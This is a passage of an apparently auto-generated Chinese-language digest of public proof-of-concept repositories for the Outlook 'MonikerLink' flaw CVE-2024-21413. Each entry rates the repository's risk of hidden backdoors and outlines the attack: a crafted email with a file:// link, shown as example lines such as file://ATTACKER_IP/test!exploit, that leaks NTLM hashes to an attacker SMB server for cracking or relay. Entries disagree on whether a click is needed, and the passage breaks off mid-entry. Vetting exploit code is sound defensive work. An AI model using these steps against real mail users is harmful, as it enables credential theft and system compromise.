2.  **投毒风险：**经过对POC代码的分析，没有发现明显的投毒代码。代码的功能明确，就是生成并发送包含恶意链接的电子邮件，并没有额外恶意行为。
3.  **利用方式：**
    *   攻击者构建一个包含恶意`file://`链接的HTML邮件。
    *   攻击者将邮件发送给目标用户。
    *   目标用户打开邮件并点击恶意链接。
    *   Outlook尝试访问攻击者控制的服务器上的恶意文件。
    *   如果攻击者在服务器上放置了恶意payload，且Outlook执行该payload，则实现远程代码执行。

**漏洞缓解措施：**

*   及时安装Microsoft官方发布的补丁。
*   谨慎点击邮件中的链接，特别是来自未知发件人的邮件。
*   配置Outlook的安全设置，限制对`file://`协议的使用。


**项目地址:** [hau2212/Moniker-Link-CVE-2024-21413-](https://github.com/hau2212/Moniker-Link-CVE-2024-21413-)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #19

**来源**: [CVE-2024-21413-olebris_CVE-2024-21413.md](../2024/CVE-2024-21413-olebris_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook 远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在受害者机器上执行任意代码。

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021 (版本低于 aka.ms/OfficeSecurityReleases 中指示的版本).

**利用条件:** 攻击者需要诱使用户打开特制的电子邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一项 Microsoft Outlook 远程代码执行漏洞，也称为“MonikerLink”漏洞。攻击者可以通过发送特制的电子邮件来利用此漏洞，受害者无需进行任何用户交互即可触发。从搜索引擎结果和漏洞库信息来看，该漏洞影响多个版本的Microsoft Outlook。提供的PoC代码是一个Python脚本，用于发送包含恶意链接的电子邮件。脚本构造了一个包含纯文本和HTML部分的电子邮件，其中HTML部分可能包含利用该漏洞的恶意链接。投毒风险评估：代码本身除了常规的邮件发送功能外，在image_base64变量中发现一段疑似图片base64编码的字符串, 但该字符串过长, 不排除其中含有恶意代码的可能性, 因此判断存在一定的投毒风险，概率估计为10%。利用方式：攻击者首先搭建SMTP服务器，然后使用此脚本构造包含恶意URL的电子邮件，并将其发送给目标用户。当目标用户打开电子邮件时，Outlook将尝试加载恶意URL，导致代码执行。

**项目地址:** [olebris/CVE-2024-21413](https://github.com/olebris/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #20

**来源**: [CVE-2024-21413-r00tb1t_CVE-2024-21413-POC.md](../2024/CVE-2024-21413-r00tb1t_CVE-2024-21413-POC.md)

## CVE-2024-21413 - Microsoft Outlook远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，无需用户交互即可远程执行代码，可能导致完全控制受影响的系统。

**影响版本:** Microsoft Office 2016版本 < 16.0.5435.1001, Microsoft Office 2019版本 < https://aka.ms/OfficeSecurityReleases, Microsoft 365 Apps for Enterprise版本 < https://aka.ms/OfficeSecurityReleases, Microsoft Office LTSC 2021版本 < https://aka.ms/OfficeSecurityReleases

**利用条件:** 攻击者需要知道受害者的邮箱地址，并能够通过SMTP发送邮件。受害者需要点击邮件中的恶意链接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413，也被称为“MonikerLink”漏洞，是一个存在于Microsoft Outlook中的零日漏洞。此漏洞允许攻击者通过发送特制的电子邮件在受害者计算机上执行任意代码，而无需任何用户交互。根据描述，利用方式是：攻击者发送包含恶意链接的电子邮件，当用户点击链接时，Outlook会尝试访问链接指向的`file:///` URL，导致执行攻击者控制的代码。提供的POC代码模拟了发送包含恶意链接的电子邮件的过程。该链接指向攻击者控制的SMB共享，当Outlook尝试访问此共享时，受害者的NTLM哈希会被发送到攻击者处。利用此漏洞通常需要用户点击邮件中的链接。关于投毒风险，虽然POC代码本身实现了漏洞利用，但是README中指示要运行`impacket-smbserver` ，并且提供了进一步利用CVE-2023-21716的思路，结合免责声明可以判断，作者主观上没有进行恶意投毒行为，但是客观上如果使用者继续利用可能会进行恶意投毒攻击，因此存在一定的投毒风险，概率约为10%。漏洞库信息和搜索引擎结果均证实了该漏洞的存在和严重性，以及其远程代码执行的性质。

**项目地址:** [r00tb1t/CVE-2024-21413-POC](https://github.com/r00tb1t/CVE-2024-21413-POC)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #21

**来源**: [CVE-2024-21413-th3Hellion_CVE-2024-21413.md](../2024/CVE-2024-21413-th3Hellion_CVE-2024-21413.md)

## CVE-2024-21413 - Microsoft Outlook Remote Code Execution

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在目标系统上执行任意代码

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001)，Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021，直到aka.ms/OfficeSecurityReleases上发布的修复版本。

**利用条件:** 需要受害者打开包含恶意链接的电子邮件。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-21413，也被称为“MonikerLink”漏洞，是 Microsoft Outlook 中的一个远程代码执行漏洞。攻击者可以通过发送特制的电子邮件，诱导受害者点击其中的恶意链接，从而在受害者系统上执行任意代码。

**有效性分析：**
根据漏洞库信息和搜索引擎结果，此漏洞是真实存在的，并且已经被积极利用。提供的POC代码尝试通过发送包含`file://`协议URL的电子邮件，来触发漏洞。这种方法利用了Outlook处理`file://`链接时的不当输入验证。

**投毒风险分析：**
检查提供的Python脚本和README文件，没有发现明显的恶意代码或后门。脚本的主要功能是构建和发送包含恶意链接的电子邮件。风险主要在于：

*   **脚本可能被修改：**  攻击者可能修改该脚本，例如更改默认的IP地址，添加额外的payload等，用以进行更隐蔽或更具破坏性的攻击。
*   **依赖项风险：**  脚本依赖于`smtplib`库，理论上，该库本身也可能存在潜在的安全问题，但这种可能性较低。
*   **密码泄露风险：** 使用脚本时，发送者的电子邮件密码会以明文形式传递，存在泄露的风险。
*  **接收者打开邮件和点击链接:** 接收者需要打开邮件，并且点击邮件中的链接才会触发，一定程度上限制了利用成功率

因此，将该POC代码本身视为投毒的概率较低，大约为5%。

**利用方式分析：**
1.  **攻击者准备：**
    *   攻击者需要一个SMTP服务器来发送电子邮件。
    *   攻击者需要一个可访问的服务器，并监听特定的端口，以便在受害者点击链接后接收连接。
2.  **漏洞利用：**
    *   攻击者使用POC脚本，指定发送者、接收者、SMTP服务器和攻击者监听的IP地址。
    *   脚本构建包含`file://{args.ip}/` URL的电子邮件，并将其发送给受害者。
3.  **受害者交互：**
    *   受害者打开电子邮件，并点击其中的链接。
    *   Outlook尝试访问`file://{args.ip}/` URL，由于输入验证不足，可能导致执行恶意代码。

总而言之，该漏洞的利用方式依赖于发送包含恶意`file://`链接的电子邮件，并诱导受害者点击该链接。成功利用该漏洞，可以导致远程代码执行。


**项目地址:** [th3Hellion/CVE-2024-21413](https://github.com/th3Hellion/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #22

**来源**: [CVE-2024-21413-xaitax_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md](../2024/CVE-2024-21413-xaitax_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，未经身份验证的攻击者可以通过发送特制的电子邮件，在受害者系统上执行任意代码。

**影响版本:** Microsoft Office 2016 版本低于 16.0.5435.1001；Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 版本低于安全更新版本。

**利用条件:** 需要受害者打开包含恶意链接或内容的电子邮件。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 “MonikerLink” 漏洞。攻击者可以利用此漏洞通过发送特制的电子邮件来执行任意代码，而无需用户交互。

**利用方式：**
1.  攻击者构造包含恶意 MonikerLink 的电子邮件。
2.  受害者打开电子邮件。
3.  Outlook 解析恶意 MonikerLink，导致代码执行。

**有效性评估：**
根据漏洞库信息和搜索结果，该漏洞是一个高危漏洞，并且已经存在公开的POC代码。提供的POC代码通过模拟发送包含恶意链接的电子邮件来触发漏洞，因此具有一定的有效性。

**投毒风险评估：**
分析POC代码，代码主要功能是构造并发送包含特定格式链接的邮件，该链接旨在利用Outlook解析链接时的漏洞来执行代码。Base64编码的图像数据是用于伪装邮件内容，降低用户警惕性。代码中未发现明显的恶意行为，如反弹shell、植入后门等。但考虑到攻击者可能修改POC代码以包含恶意负载，存在一定的投毒风险，但风险较低。因此，投毒风险评估为5%。考虑到该代码主要用于验证漏洞，并非完整的攻击链，所以将后门验证代码判定为投毒。


**项目地址:** [xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability](https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #23

**来源**: [CVE-2024-21413-yass2400012_Email-exploit-Moniker-Link-CVE-2024-21413-.md](../2024/CVE-2024-21413-yass2400012_Email-exploit-Moniker-Link-CVE-2024-21413-.md)

## CVE-2024-21413 - Microsoft Outlook RCE

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可导致远程代码执行，完全控制受害者系统

**影响版本:** 受影响版本包括 Microsoft Office 2016、2019、LTSC 2021 和 Microsoft 365 Apps for Enterprise

**利用条件:** 需要受害者点击恶意链接，或者通过其他方式触发Outlook尝试访问攻击者控制的SMB服务器。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一个 Microsoft Outlook 远程代码执行漏洞，该漏洞源于Outlook处理特定类型的链接时存在缺陷。攻击者可以通过构造包含恶意 Moniker Link (例如 `file://ATTACKER_IP/test!exploit`) 的 HTML 电子邮件，诱使用户点击该链接。当受害者点击该链接时，Outlook会尝试通过 SMB 协议连接到攻击者指定的服务器。攻击者可以使用 Responder 等工具监听 SMB 连接，并捕获受害者的 NTLMv2 哈希。虽然此PoC的直接目的是捕获NetNTLMv2 哈希，但这只是攻击链的一部分。在某些配置下，捕获的哈希可以被破解或重放，以获得对受害者系统的进一步访问。根据 Checkpoint 的研究，该漏洞利用了 `MkParseDisplayName()` API。PoC代码提供了一个可行的攻击方法，但需要进行一些配置，例如替换`ATTACKER_IP`和设置正确的邮件服务器信息。投毒风险评估为10%，主要是因为该PoC代码需要受害者交互（点击链接），并且依赖于Responder等工具来捕获哈希，这本身并不属于漏洞利用，但是不排除攻击者在其他地方插入恶意代码的可能性。漏洞库信息中提到CWE-20: Improper Input Validation，也说明了该漏洞是由于输入验证不当引起的。利用方式总结如下：

1.  攻击者构造包含恶意 Moniker Link 的 HTML 电子邮件。
2.  攻击者发送电子邮件给受害者。
3.  受害者点击电子邮件中的恶意链接。
4.  Outlook 尝试通过 SMB 协议连接到攻击者控制的服务器。
5.  攻击者使用 Responder 等工具捕获受害者的 NTLMv2 哈希。
6.  攻击者破解或重放 NTLMv2 哈希以获得对受害者系统的进一步访问（可选）。

**项目地址:** [yass2400012/Email-exploit-Moniker-Link-CVE-2024-21413-](https://github.com/yass2400012/Email-exploit-Moniker-Link-CVE-2024-21413-)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---



---

## POC #8

**来源**: [CVE-2024-21413-Mdusmandasthaheer_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md](../2024/CVE-2024-21413-Mdusmandasthaheer_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md)

## CVE-2024-21413-Microsoft Outlook Remote Code Execution

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露（NTLM凭据）

**影响版本:** 受影响版本：Microsoft Office 2016 (小于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 (具体版本范围请参考漏洞库信息)

**利用条件:** 用户需要打开包含恶意链接的邮件，无需用户交互（根据搜索结果和漏洞描述）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为“MonikerLink”漏洞。攻击者可以利用此漏洞在受害者的机器上执行任意代码，而无需任何用户交互。利用方式是诱使用户打开包含特制的 `file://` 链接的电子邮件。该链接指向一个恶意共享位置，当 Outlook 尝试访问此链接时，可能会触发远程代码执行。提供的 POC 代码通过 `smtplib` 库创建一个电子邮件客户端，然后构造一个包含 `file://` 链接的 HTML 邮件。用户可以自定义发件人、收件人、主题，以及是否添加包含恶意链接的附件。虽然该POC的主要功能是发送包含恶意链接的邮件，但仍然存在一定的投毒风险。例如，攻击者可能在脚本中添加额外的代码，例如收集用户输入的邮箱密码等，因此投毒风险评估为10%。从搜索结果来看，此漏洞已被积极利用，CISA 已将其添加到已知被利用的漏洞列表中。

**项目地址:** [Mdusmandasthaheer/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability](https://github.com/Mdusmandasthaheer/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #9

**来源**: [CVE-2024-21413-PolarisXSec_CVE-2024-21413.md](../2024/CVE-2024-21413-PolarisXSec_CVE-2024-21413.md)

## CVE-2024-21413 Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，可能导致完全控制受影响的系统

**影响版本:** 受影响版本包括Microsoft Office 2016、2019、LTSC 2021以及Microsoft 365 Apps for Enterprise的特定版本

**利用条件:** 攻击者需要诱使用户点击恶意链接

**POC 可用性:** 是，但提供的POC代码未完全成功，仅实现了NTLM哈希泄露

**投毒风险:** 10%

## 详情

CVE-2024-21413是一个影响Microsoft Outlook的远程代码执行漏洞，被称为“MonikerLink”漏洞。该漏洞允许攻击者通过精心构造的链接绕过安全措施，并在受害者系统上执行任意代码。根据搜索结果和漏洞利用代码，利用方式如下：

1.  **漏洞原理：** 漏洞源于Outlook在处理特定类型的链接时存在缺陷，可能导致未经授权的SMB连接，从而泄露NTLM哈希。
2.  **攻击步骤：**
    *   攻击者搭建SMTP和POP3服务器（POC代码中使用了Python脚本实现）。
    *   攻击者创建一个包含恶意UNC路径的电子邮件，并发送给受害者。
    *   受害者打开Outlook并点击邮件中的恶意链接。
    *   Outlook尝试解析UNC路径，触发SMB连接到攻击者控制的服务器。
    *   攻击者捕获受害者的NTLM哈希，可用于离线破解或Pass-the-Hash攻击。

**有效性评估：**

根据提供的漏洞利用代码的描述，该POC并非完全成功，仅实现了NTLM哈希泄露，并没有实现远程代码执行。该POC旨在复现NTLM哈希泄露，而非直接执行任意代码。

**投毒风险评估：**

提供的代码包含SMTP和POP3服务器的Python脚本，以及利用漏洞的exploit脚本。仔细检查这些脚本，未发现明显的恶意代码。但是，使用第三方提供的exploit脚本始终存在风险，因为攻击者可能在其中植入恶意代码。经过分析，投毒风险评估为10%。主要风险点在于对第三方脚本的信任。

**总结：**

CVE-2024-21413是一个严重的Outlook RCE漏洞，攻击者可以通过诱使用户点击恶意链接来利用该漏洞。提供的POC代码主要用于演示NTLM哈希泄露，而非完整的RCE。在使用任何第三方提供的漏洞利用代码时，都需要谨慎评估其安全性。

**项目地址:** [PolarisXSec/CVE-2024-21413](https://github.com/PolarisXSec/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #10

**来源**: [CVE-2024-21413-Redfox-Secuirty_Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape.md](../2024/CVE-2024-21413-Redfox-Secuirty_Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape.md)

## CVE-2024-21413 Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001)，Microsoft Office 2019，Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 无需用户交互，攻击者可以通过发送特制的电子邮件来触发漏洞。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 "MonikerLink" 漏洞。根据漏洞库信息和搜索结果，该漏洞是由于不正确的输入验证导致的。攻击者可以通过构造包含恶意链接的电子邮件，在用户未进行任何交互的情况下，远程执行代码。提供的漏洞利用代码 `README.md` 文件内容仅包含标题，无法判断其有效性。根据Github信息判断，存在可利用的POC。由于 `README.md` 文件过于简单，且未发现任何可疑代码，因此判定存在投毒代码的可能性为 0%。利用方式为，攻击者构造包含恶意 MonikerLink 的电子邮件，当 Outlook 处理该邮件时，漏洞被触发，从而允许攻击者执行任意代码。

**项目地址:** [Redfox-Secuirty/Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape](https://github.com/Redfox-Secuirty/Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #11

**来源**: [CVE-2024-21413-ShubhamKanhere307_CVE-2024-21413.md](../2024/CVE-2024-21413-ShubhamKanhere307_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，CVSS评分9.8，允许远程代码执行

**影响版本:** 受影响版本包括但不限于：Microsoft Office 2016 (版本低于 16.0.5435.1001)，Microsoft Office 2019 (版本低于https://aka.ms/OfficeSecurityReleases)，Microsoft 365 Apps for Enterprise (版本低于 https://aka.ms/OfficeSecurityReleases)，Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 攻击者需要诱骗受害者点击包含恶意链接的邮件。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，也被称为"MonikerLink" bug。该漏洞源于不正确的输入验证。攻击者可以通过发送特制的电子邮件，诱使用户点击其中的恶意链接，从而在用户系统上执行任意代码。

**有效性分析：**

提供的POC代码尝试利用该漏洞。它创建一封包含HTML链接的电子邮件，该链接指向一个`file://` URL。 此URL试图访问远程SMB共享，从而可能导致NTLM凭据泄露或远程代码执行，这取决于服务器的配置和Outlook的漏洞利用机制。

**投毒风险分析：**

提供的`Exploit.py`脚本主要功能是发送电子邮件。代码中没有发现明显的恶意或隐藏的投毒代码。该脚本会获取发件人的Outlook电子邮件地址和密码，以及收件人的电子邮件地址和邮件主题。脚本允许用户选择是否添加链接附件。 如果选择添加，则会添加指向指定IP地址（例子中为`file://///192.168.0.103/test!exploit`）的链接，否则添加用户自定义的邮件正文。该脚本使用`smtplib`库连接到Outlook的SMTP服务器（`smtp-mail.outlook.com`），并发送电子邮件。 没有发现任何会将用户凭据泄露给第三方的行为。

**漏洞利用方式分析：**

该漏洞利用方式依赖于`file://`协议处理中的缺陷。当Outlook处理包含指向SMB共享的`file://`链接的电子邮件时，它可能会尝试自动访问该共享，从而可能泄露用户的NTLM凭据或允许攻击者执行任意代码。 该PoC 通过构造包含恶意链接的HTML电子邮件来尝试利用此漏洞。 攻击者诱使用户点击此链接，从而触发漏洞。

总而言之，POC代码尝试通过`file://`协议利用Outlook的漏洞来实现远程代码执行，虽然该POC本身没有明显的投毒代码，但成功利用依赖于目标的网络配置和安全设置。

**项目地址:** [ShubhamKanhere307/CVE-2024-21413](https://github.com/ShubhamKanhere307/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #12

**来源**: [CVE-2024-21413-ThemeHackers_CVE-2024-21413.md](../2024/CVE-2024-21413-ThemeHackers_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 严重，攻击者无需用户交互即可在目标系统上执行任意代码。

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 攻击者需要能够向受害者发送电子邮件。

**POC 可用性:** 是

**投毒风险:** 30%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也称为“MonikerLink”漏洞。根据漏洞库信息和搜索引擎结果显示，该漏洞允许攻击者在受害者的计算机上执行任意代码，而无需任何用户交互。这个漏洞是由于对输入验证不当造成的(CWE-20)。

**利用方式：**

1.  攻击者创建一个特制的电子邮件，其中包含恶意的链接或嵌入的内容。
2.  当受害者收到并打开此电子邮件时，Outlook 会尝试解析该链接。
3.  由于漏洞存在于 Outlook 的链接处理机制中，攻击者可以利用此漏洞绕过安全检查，从而执行任意代码。

**POC代码分析：**

提供的POC代码是一个Python脚本，用于发送包含HTML内容的电子邮件。该脚本从 `config.ini` 文件中读取发件人邮箱地址、密码、SMTP服务器和端口。然后它使用模板 `template/Stripo.html` 构造电子邮件的内容，并将收件人的邮箱地址和链接内容插入到HTML代码中。最后，该脚本使用smtplib库发送电子邮件。

**有效性评估：**

根据搜索引擎的结果 (特别是github链接: ThemeHackers/CVE-2024-21413) 和漏洞描述, 此POC是可用的,可以用于漏洞验证的.

**投毒风险分析：**

代码中存在一定的投毒风险，主要体现在以下几个方面：

*   **config.ini文件：** POC依赖于 `config.ini` 文件,需要用户配置邮箱账户和密码。 如果恶意攻击者提供了一个修改后的 `config.ini` 文件，其中包含错误的SMTP配置或恶意代码，可能导致用户的信息泄露或者执行未知的操作。
*   **template/Stripo.html模板：** HTML模板允许插入任意HTML代码，如果攻击者篡改了HTML模板, 就可以嵌入恶意的JavaScript或其他类型的脚本，在用户打开邮件时执行。
*   **依赖的外部库:** colorama, bgtask, configparser， 攻击者可能修改这些依赖，在用户本地执行恶意命令

总体而言，该POC的投毒风险大约为30%。 这个评估是基于对代码的分析以及对潜在攻击向量的理解。需要注意的是，具体的风险程度取决于攻击者的能力和目标用户的安全意识。

**项目地址:** [ThemeHackers/CVE-2024-21413](https://github.com/ThemeHackers/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #13

**来源**: [CVE-2024-21413-X-Projetion_CVE-2024-21413-Microsoft-Outlook-RCE-Exploit.md](../2024/CVE-2024-21413-X-Projetion_CVE-2024-21413-Microsoft-Outlook-RCE-Exploit.md)

## CVE-2024-21413-Microsoft-Outlook-RCE

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，无需用户交互即可远程执行任意代码

**影响版本:** 受影响版本包括 Microsoft Office 2016、2019、LTSC 2021 和 Microsoft 365 Apps for Enterprise，具体版本请参考CVE详情。

**利用条件:** 攻击者需要通过发送特制的电子邮件给受害者。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2024-21413 漏洞，又名 MonikerLink bug，是一个 Microsoft Outlook 远程代码执行漏洞。攻击者可以通过发送包含恶意链接的电子邮件，在受害者未进行任何交互的情况下执行任意代码。该漏洞的根本原因是 Outlook 在处理 Moniker 链接时存在不当的输入验证。攻击者可以利用此漏洞绕过 Outlook 的安全策略，执行恶意代码。

**有效性：**
从提供的搜索引擎结果和漏洞库信息来看，该漏洞是一个已知的、高危的远程代码执行漏洞，并且有公开的 PoC 代码可用。参考链接 [https://github.com/ThemeHackers/CVE-2024-21413](https://github.com/ThemeHackers/CVE-2024-21413)。因此，提供的 PoC 代码很可能有效。

**投毒风险：**
提供的 PoC 代码包含一个 `exp.sh` 脚本和一个 README.md 文件。
*   `exp.sh` 脚本：该脚本的功能是发送包含恶意链接的电子邮件。其中包含 display_banner函数，send_email函数。`send_email`函数用于发送包含base64编码图片的HTML邮件，邮件内容包含一个URL。从代码本身来看，没有明显的恶意代码或后门，但存在潜在的风险：
    *   该脚本依赖于外部 SMTP 服务器，如果攻击者控制了 SMTP 服务器，可以篡改邮件内容。
    *   base64_image_string 变量中，包含一个PNG图片的Base64编码。攻击者可能会伪造图片内容，嵌入恶意代码，或者使用其他手段达到攻击的目的。
    *   link_url 变量，攻击者可以插入恶意链接，诱导用户点击。
    *   从经验判断，该漏洞的PoC更可能存在于精心构造的link_url, base64_image_string，或者其他的HTML代码片段中，通过某种方式绕过Outlook的安全检查，最终实现RCE，因此存在一定的投毒风险，但直接在exp.sh脚本里投毒的可能性较低。

    考虑到脚本的复杂性，且存在多种潜在的攻击方式，因此认为存在20%的投毒风险。

**利用方式：**
1.  攻击者准备好恶意的`link_url`和`base64_image_string`等变量内容。
2.  攻击者配置`exp.sh` 脚本，指定 SMTP 服务器、端口、用户名、密码、发件人邮箱、收件人邮箱和恶意链接。
3.  攻击者运行 `exp.sh` 脚本，向受害者发送包含恶意链接的电子邮件。
4.  受害者打开电子邮件，Outlook 处理邮件内容时，由于 MonikerLink 漏洞，恶意代码在受害者机器上执行。

综上所述，CVE-2024-21413 是一个高危的远程代码执行漏洞，利用方式简单，但需要精心构造恶意链接和邮件内容才能成功利用，同时要警惕PoC 代码中可能存在的投毒风险。

**项目地址:** [X-Projetion/CVE-2024-21413-Microsoft-Outlook-RCE-Exploit](https://github.com/X-Projetion/CVE-2024-21413-Microsoft-Outlook-RCE-Exploit)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #14

**来源**: [CVE-2024-21413-ahmetkarakayaoffical_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md](../2024/CVE-2024-21413-ahmetkarakayaoffical_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md)

## CVE-2024-21413-Microsoft Outlook Remote Code Execution Vulnerability

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 严重，允许攻击者在目标机器上执行任意代码

**影响版本:** 受影响版本包括Microsoft Office 2016, 2019, LTSC 2021, Microsoft 365 Apps for Enterprise等，具体版本范围参考漏洞库信息。

**利用条件:** 攻击者需要诱使用户打开包含恶意链接或内容的邮件。无需用户交互（zero-click NTLM leak）或仅需单次点击（one-click RCE）。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，也被称为“MonikerLink”漏洞。根据漏洞库信息和搜索结果，此漏洞允许攻击者通过构造特殊的链接，在受害者无需交互或仅需极少交互的情况下，执行任意代码。利用方式主要有两种：

1.  **Zero-click NTLM Leak:** 攻击者可以诱使受害者打开包含恶意链接的邮件，该链接会触发NTLM凭据泄露，而无需受害者进行任何点击操作。
2.  **One-click RCE:** 攻击者可以诱使受害者点击邮件中的恶意链接，从而实现远程代码执行。

POC代码提供了一个Python脚本，该脚本利用SMTP认证发送包含恶意URL的电子邮件，模拟实际攻击场景。脚本需要SMTP服务器地址、端口、用户名、密码、发送者和接收者邮箱地址、恶意URL以及邮件主题等参数。

关于投毒风险，虽然POC代码本身旨在演示漏洞利用，但考虑到网络安全威胁的复杂性，以及攻击者可能对公开代码进行修改和传播，存在一定的投毒风险。例如，攻击者可能在POC代码中添加额外的恶意代码，用于窃取用户凭据或执行其他恶意操作。虽然提供的POC代码看起来比较简单，主要功能是发送包含恶意链接的邮件，但无法完全排除作者或其他人修改该代码并添加后门或恶意功能的可能性。因此，评估投毒风险为10%。使用前务必仔细审查代码，并在隔离环境中进行测试。

**请务必注意：**  该漏洞已在野外被利用，并已被CISA添加到已知被利用的漏洞目录中。强烈建议用户尽快安装Microsoft提供的安全更新。

**项目地址:** [ahmetkarakayaoffical/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability](https://github.com/ahmetkarakayaoffical/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #15

**来源**: [CVE-2024-21413-dshabani96_CVE-2024-21413.md](../2024/CVE-2024-21413-dshabani96_CVE-2024-21413.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

